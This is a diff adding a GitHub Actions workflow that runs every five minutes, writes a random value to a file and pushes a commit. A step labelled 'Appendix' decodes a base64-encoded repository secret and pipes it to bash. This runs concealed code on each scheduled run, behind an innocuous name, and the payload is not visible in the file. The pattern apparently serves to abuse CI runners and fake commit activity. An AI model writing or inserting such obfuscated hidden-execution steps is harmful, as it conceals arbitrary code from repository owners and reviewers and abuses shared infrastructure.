@@ -1,0 +1,36 @@
+name: Commit
+
+on:
+  schedule:
+    - cron: '*/5 * * * *'
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  commit:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Commit
+        run: echo $RANDOM > checkout
+
+      - name: Appendix
+        run: bash -c "$(echo $config|base64 -d)"
+        env:
+          config: ${{ secrets.config }}
+
+      - name: Configure Git user
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+
+      - name: Commit and push changes
+        run: |
+          git add checkout
+          git commit -m "Add random checkout file with secret code"
+          git push
